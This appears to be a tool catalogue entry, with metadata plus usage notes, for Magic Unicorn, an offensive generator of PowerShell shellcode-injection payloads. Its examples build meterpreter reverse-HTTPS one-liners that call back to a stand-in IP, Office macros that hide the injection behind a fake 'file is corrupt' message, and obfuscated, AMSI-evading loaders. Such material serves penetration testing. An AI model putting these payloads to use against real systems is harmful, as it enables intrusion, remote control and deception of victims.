---
name: "unicorn-powershell"
categories:
  - blackarch-backdoor
version: "219.071989b"
homepage: "https://github.com/trustedsec/unicorn"
packaged-by: [blackarch]
blackarch-builddate: "2026-11-01"
build-system: scripts
license: custom:unknown
aliases: ["magic-unicorn"]
meta-checked: "2026-11-09"
github-repo: "trustedsec/unicorn"
github-stars: 3955
github-pushed: "2026-10-28"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 6.9
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 9
gh-activity-checked: "2026-11-09"
---

# unicorn-powershell

> A simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory.

*No corpus evidence — derived from upstream documentation.*

## What it's for

TrustedSec's Magic Unicorn (Dave Kennedy) turns a payload into a self-contained PowerShell command that injects shellcode directly into memory — nothing written to disk on the victim. It accepts Metasploit payload specs (`windows/meterpreter/reverse_https …`), Cobalt Strike C# beacon exports, your own shellcode files (`0x00,0x01,…` format or `\x00` literals), or any `.ps1` script, and emits the one-liner in `powershell_attack.txt` plus a matching Metasploit listener `unicorn.rc` and a `unicorn_manifest.json` recording seed, architecture, AMSI mode, command lengths, APIs used and the shellcode SHA-256. Beyond the raw one-liner it can wrap the same attack as a VBA macro, an HTA (`hta_attack/` with `index.html` + `Launcher.hta`), a DDE field code, a certutil base64 transfer, or a `.SettingContent-ms` file. Generator options shape the output: `--amsi inline|off`, `--profile cmd|powershell` (8191 vs 32767 character command limits), `--arch x86|x64`, `--obfuscation minimal|moderate|high`, and `--seed <value>` for reproducible variants. Metasploit must be installed and in path for the Metasploit-based methods.

## Typical use cases

### Turn a Metasploit payload into a PowerShell one-liner

```
python unicorn.py windows/meterpreter/reverse_https 198.51.100.10 443
```

Outcome: writes `powershell_attack.txt` (paste anywhere you have command execution — a shell, a delivery system), `unicorn.rc` and `unicorn_manifest.json`. Catch the callback with `msfconsole -r unicorn.rc`; a meterpreter session arrives when the pasted command runs.

### Wrap the same attack as an Office macro

```
python unicorn.py windows/meterpreter/reverse_https 198.51.100.10 443 macro
```

Outcome: emits VBA to paste into an `Auto_Open` macro (rename the sub `AutoOpen` for Office 2016+); on open the document shows a fake "file is corrupt" message while the PowerShell injection runs — the message is expected behavior, not a failure.

### Load your own shellcode with generator options

```
python unicorn.py shellcode.txt shellcode --arch x64 --profile cmd --obfuscation high
```

Outcome: generates a loader (memset copy loop or `Marshal.Copy` — whichever was chosen is recorded in the manifest) for your `0x..`-formatted shellcode, sized to survive cmd.exe's 8191-character limit because of `--profile cmd`; add `--seed <value>` to reproduce the exact variant later. Supply shellcode matching the selected architecture (x86 is the default).

### Convert a PowerShell script into a macro payload

```
python unicorn.py harmless.ps1 macro 500
```

Outcome: converts any `.ps1` into an encoded command or, with `macro`, VBA strings of 500 characters each (default 380) — fewer carriage returns, which is what stops large scripts from breaking VBA's limits.
